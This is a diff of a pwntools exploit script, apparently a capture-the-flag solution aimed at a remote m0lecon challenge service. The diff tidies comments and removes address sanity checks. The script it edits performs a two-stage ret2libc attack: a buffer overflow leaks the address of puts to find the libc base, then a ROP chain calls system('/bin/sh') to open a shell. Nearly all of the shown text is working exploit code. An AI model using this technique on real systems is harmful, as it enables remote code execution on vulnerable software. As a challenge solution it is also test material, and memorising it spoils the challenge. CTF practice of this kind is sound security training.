@@ -28,7 +28,7 @@ p = remote("offsec.m0lecon.it", 13525)
 #b *vuln+96
 #continue
 #""")
-# -------- Stage 1: leak puts --------
+#Stage 1: leak puts
 p.recvuntil(b'Write your message:\n')
 stage1 = flat(
     b'A' * OFFSET_TO_RIP,
@@ -39,7 +39,7 @@ stage1 = flat(
 )
 log.info("sending stage1")
 p.sendline(stage1)
-p.recvline()                        # consume "Let me check..."
+p.recvline()                        
 
 log.info("waiting leak...")
 leaked = p.recvline().strip()
@@ -52,7 +52,7 @@ libc_base = leak_puts - libc.symbols['puts']
 log.info(f"libc base = {libc_base:#x}")
 
 
-# -------- Stage 2: system("/bin/sh") --------
+#Stage 2: system("/bin/sh")
 #gdb.attach(p)
 #p = gdb.debug(elf.path, gdbscript="""
 #continue
@@ -78,17 +78,6 @@ stage2 = flat(
     p64(exit_),
     )
 
-def is_reasonable(addr):
-    return 0x7f0000000000 < addr < 0x7fffffffffff
-
-log.info(f"binsh valid range? {is_reasonable(binsh)}")
-log.info(f"system valid range? {is_reasonable(system)}")
-
-try:
-    test = p64(binsh)
-    log.info("binsh packed OK")
-except Exception as e:
-    log.error(f"binsh packing failed: {e}")
 
 #print(f"exit_= {exit_}, RIP+OFFSET= {OFFSET_TO_RIP}, RET={RET}, POP_RDI= {POP_RDI}, binsh= {binsh}, system= {system}")
 #print(f"stage2= {stage2}")
